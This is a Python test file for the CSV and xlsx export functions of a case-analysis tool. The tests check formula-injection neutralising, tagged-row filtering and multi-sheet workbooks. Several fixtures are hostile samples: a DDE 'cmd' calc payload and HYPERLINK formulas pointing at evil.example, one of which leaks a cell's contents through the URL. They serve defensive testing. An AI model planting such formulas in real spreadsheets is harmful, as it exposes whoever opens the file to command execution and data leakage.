"""store.py export: CSV formula-injection prefixing (without mutating the
stored value), tagged_only filtering, and the tagged-rows xlsx workbook."""

from __future__ import annotations

import csv
import io

from openpyxl import load_workbook


def _export_csv_text(store, view_id, tagged_only=False):
    return "".join(store.export_view_csv(view_id, tagged_only=tagged_only))


def test_csv_export_prefixes_formula_leads_without_mutating_stored_value(store, write_csv):
    path = write_csv([
        ["Note"],
        ["=cmd|' /C calc'!A1"],
        ["+1+1"],
        ["-1+1"],
        ["@SUM(1,1)"],
        ["plain text"],
    ])
    rec = store.ingest_csv(path, name="formulas.csv", build_fts=False)
    view = store.build_view(rec["id"], {"source_id": rec["id"], "filters": [], "sort": []})

    text = _export_csv_text(store, view["view_id"])
    rows = list(csv.reader(io.StringIO(text)))
    body = rows[1:]
    values = [r[-1] for r in body]  # last column is "Note"
    prefixed = {v for v in values if v.startswith("'")}
    assert "'=cmd|' /C calc'!A1" in prefixed
    assert "'+1+1" in prefixed
    assert "'-1+1" in prefixed
    assert "'@SUM(1,1)" in prefixed
    assert "plain text" in values  # untouched

    # The exported copy is prefixed, but the stored value in the case file
    # itself must be byte-for-byte what was ingested — export never mutates
    # source data.
    stored = [r["cells"][0] for r in store.fetch_rows(view["view_id"], 0, 10)["rows"]]
    assert "=cmd|' /C calc'!A1" in stored
    assert "+1+1" in stored


def test_csv_export_tagged_only(ingested):
    store, source_id = ingested
    tag = store.upsert_tag(None, "Keep", "#ff0000", None)
    store.set_tags(source_id, [1], tag["id"], True)
    view = store.build_view(source_id, {"source_id": source_id, "filters": [], "sort": []})

    all_rows = list(csv.reader(io.StringIO(_export_csv_text(store, view["view_id"]))))
    tagged_rows = list(csv.reader(io.StringIO(_export_csv_text(store, view["view_id"], tagged_only=True))))
    assert len(all_rows) - 1 == 4  # header + 4 fixture rows
    assert len(tagged_rows) - 1 == 1
    assert tagged_rows[1][0] == "1"  # Line column is the rid
    assert tagged_rows[1][1] == "Keep"


def test_xlsx_export_one_sheet_per_tagged_source(store, write_csv):
    p1 = write_csv([["A"], ["1"], ["2"]], name="x1.csv")
    p2 = write_csv([["A"], ["3"]], name="x2.csv")  # never tagged -> no sheet
    rec1 = store.ingest_csv(p1, name="x1.csv", build_fts=False)
    store.ingest_csv(p2, name="x2.csv", build_fts=False)
    tag = store.upsert_tag(None, "T", "#000000", None)
    store.set_tags(rec1["id"], [1], tag["id"], True)

    buf = store.export_tagged_xlsx()
    wb = load_workbook(buf)
    assert wb.sheetnames == ["x1.csv"]  # only the tagged source gets a sheet
    ws = wb["x1.csv"]
    header = [c.value for c in ws[1]]
    assert header == ["Line", "Tags", "Note", "A"]
    data_rows = [[c.value for c in row] for row in ws.iter_rows(min_row=2)]
    assert data_rows == [[1, "T", None, "1"]]


def test_xlsx_export_empty_case_still_produces_a_workbook(store):
    buf = store.export_tagged_xlsx()
    wb = load_workbook(buf)
    assert wb.sheetnames == ["No tagged rows"]


def test_csv_export_includes_derived_columns(store, write_csv):
    """A regex/timestamp/JSON derived column is part of the table the
    analyst sees — the export has to carry it like any base column."""
    path = write_csv([["Uri"], ["https://a.example/x"], ["https://b.example/y"]])
    rec = store.ingest_csv(path, name="uri.csv", build_fts=False)
    res = store.add_derived_column(rec["id"], "Host", "Uri", "regex_extract",
                                   {"pattern": r"^\w+://([^/]+)"})
    store.wait_for_ingest_job(res["job_id"], timeout=30)
    view = store.build_view(rec["id"], {"source_id": rec["id"], "filters": [], "sort": []})
    text = _export_csv_text(store, view["view_id"])
    lines = text.strip().splitlines()
    assert lines[0].endswith(",Host")
    assert lines[1].endswith(",a.example") and lines[2].endswith(",b.example")


FORMULA_HEADER = '=HYPERLINK("http://evil.example/?"&A2,"click")'
FORMULA_TAG = '=HYPERLINK("http://evil.example","open")'


def _formula_case(store, write_csv):
    path = write_csv([[FORMULA_HEADER, "@SUM(1+1)", "plain"], ["a", "b", "c"], ["d", "e", "f"]],
                     name="hdr.csv")
    sid = store.ingest_csv(path, name="hdr.csv", build_fts=False)["id"]
    tag = store.upsert_tag(None, FORMULA_TAG, "#ff0000", None)
    store.set_tags(sid, [1], tag["id"], True)
    return sid


def test_csv_export_neutralises_formula_column_and_tag_names(store, write_csv):
    """Column names are header text from the evidence file and tag names
    arrive in adopted sessions; both went into the CSV raw while every cell
    beside them was prefixed. Both the virtual (unfiltered) and the
    materialised (sorted) export paths."""
    sid = _formula_case(store, write_csv)
    for spec in ({"filters": [], "sort": []},
                 {"filters": [], "sort": [{"column": "plain", "dir": "desc"}]}):
        view = store.build_view(sid, {"source_id": sid, **spec})
        rows = list(csv.reader(io.StringIO(_export_csv_text(store, view["view_id"]))))
        assert rows[0][3:] == ["'" + FORMULA_HEADER, "'@SUM(1+1)", "plain"]
        tagged = next(r for r in rows[1:] if r[0] == "1")
        assert tagged[1] == "'" + FORMULA_TAG


def test_xlsx_exports_never_write_a_header_as_a_formula(store, write_csv, tmp_path):
    """openpyxl writes any string starting with '=' as a FORMULA — an
    attacker-named column became a live HYPERLINK in the hand-over
    workbook's header row."""
    _formula_case(store, write_csv)
    path = tmp_path / "all.xlsx"
    store.export_all_xlsx(str(path))
    for wb in (load_workbook(store.export_tagged_xlsx()), load_workbook(str(path))):
        header = list(wb.worksheets[0][1])
        assert all(c.data_type != "f" for c in header)
        assert [c.value for c in header[3:]] == ["'" + FORMULA_HEADER, "'@SUM(1+1)", "plain"]


def test_tagged_xlsx_exports_more_tagged_rows_than_sqlite_binds(stock_sqlite_limits, write_csv):
    """Every tagged rid of a source went into one `IN (...)`, so past
    32,766 tagged rows — on a stock SQLite build — the workbook was a 500
    ("too many SQL variables"). The rows are now read in keyset pages."""
    store = stock_sqlite_limits
    n = 32_800
    sid = store.ingest_csv(write_csv([["x"]] + [[f"v{i}"] for i in range(n)], "many.csv"),
                           name="many.csv", build_fts=False)["id"]
    view = store.build_view(sid, {"source_id": sid, "filters": [], "sort": []})
    tag = store.upsert_tag(None, "Malware", "#ff0000", None)["id"]
    store.tag_view(view["view_id"], tag, True)
    store.set_note(sid, n, "the last one")

    ws = load_workbook(store.export_tagged_xlsx(), read_only=True).worksheets[0]
    rows = list(ws.iter_rows(values_only=True))
    assert len(rows) == n + 1
    assert rows[1] == (1, "Malware", None, "v0")
    assert rows[-1] == (n, "Malware", "the last one", f"v{n - 1}")


def test_tagged_xlsx_continues_past_a_full_sheet(store, write_csv, monkeypatch):
    """No continuation past Excel's row cap: a table with more tagged rows
    than one sheet holds made a workbook Excel refuses to open. Same
    numbered continuation sheets as the all-tables export."""
    from winnow import store as store_mod
    monkeypatch.setattr(store_mod, "XLSX_MAX_ROWS", 4)     # 3 data rows per sheet
    sid = store.ingest_csv(write_csv([["x"]] + [[f"v{i}"] for i in range(8)], "t.csv"),
                           name="t.csv", build_fts=False)["id"]
    tag = store.upsert_tag(None, "T", "#ff0000", None)["id"]
    store.set_tags(sid, [1, 2, 3, 5, 6, 7, 8], tag, True)

    wb = load_workbook(store.export_tagged_xlsx())
    assert wb.sheetnames == ["t.csv", "t.csv (2)", "t.csv (3)"]
    lines = [[r[0] for r in wb[n].iter_rows(min_row=2, values_only=True)] for n in wb.sheetnames]
    assert lines == [[1, 2, 3], [5, 6, 7], [8]]
    assert all([c.value for c in wb[n][1]] == ["Line", "Tags", "Note", "x"] for n in wb.sheetnames)
